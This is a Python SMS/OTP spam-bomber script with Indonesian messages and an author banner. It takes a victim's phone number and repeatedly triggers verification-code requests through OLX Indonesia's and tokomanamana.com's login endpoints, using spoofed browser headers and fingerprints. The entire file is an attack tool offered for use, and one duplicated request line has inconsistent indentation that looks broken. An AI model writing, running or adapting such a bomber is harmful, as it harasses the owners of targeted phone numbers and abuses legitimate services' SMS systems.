import os,sys,json
try:
	import requests as reek
	req=reek.Session()
except ModuleNotFoundError:os.system("python -m pip install requests") ; os.system(f"python {sys.argv[0]}")
class nyepam:
	def __init__(self,_8,_08,_62):
		self._8,self._08,self._62=_8,_08,_62
	def mulai(self):
		try:
			for x in range(2):
				send=req.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":self._62,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
				
                                send=req.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":self._62,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
				if "status" in send:continue
				else:continue
			for x in range(5):
				send=req.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":self._08},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
				if "Kode OTP berhasil dikirim!" in send:continue
				else:break
			exit("# DAH DONE SPAM NYA!! JANGAN DI MAIN IN LAGI YA:)")
		except reek.exceptions.ReadTimeout:exit("[!] Kesalahan Pada Koneksi")
		except reek.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
		except (KeyboardInterrupt,EOFError):exit("[!] Exit")
__import__("os").system("clear")
os.system("termux-open-url  https://t.me/syanzr ")
banner = """
\033[1;35m  
╔╦╦╦═╦╗╔═╦═╦══╦═╗
║║║║╩╣╚╣═╣║║║║║╩╣
╚══╩═╩═╩═╩═╩╩╩╩═╝
≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈»
\033[1;32m𝗔𝗨𝗧𝗛𝗢𝗥 : MUHAMMAD YUSUF
𝗬𝗢𝗨𝗧𝗨𝗕𝗘: SyanzR Gaming
𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠: syanzr
≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈»
                           
 𝘾𝘼𝙇𝙇 𝙎𝙏𝘼𝙍𝙏 𝘿𝘼𝙍𝙄 𝘼𝙉𝙂𝙆𝘼 0 𝙔𝘼 𝘽𝙍𝙊! 
  = 0856**********
«~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~»\n"""
print (banner)
while True:
	try:
		a=input("𝙏𝙐𝙅𝙐𝘼𝙉 𝙃𝙄𝘿𝙐𝙋!  : ")
		asu=a[0:2]
		if a in(""," "):print("[!] 𝙅𝘼𝙉𝙂𝘼𝙉 𝙈𝘼𝙄𝙉 𝙈𝘼𝙄𝙉 𝘿𝙊𝙉𝙂 𝙎𝘼𝙔)")
		elif "08" not in asu:print("[!] Gunakan Nomer Dengan Awalan 08xxx")
		elif len(a)<=10:print("[!] NOMER BUTUH LEBIH DARI 9 ANGKA")
		else:
			b=a[1:12] 
			c="62"+b
			nyepam(b,a,c).mulai()
			break
	except Exception as ex:exit(str(ex))
	except (KeyboardInterrupt,EOFError):exit("[!] Exit")
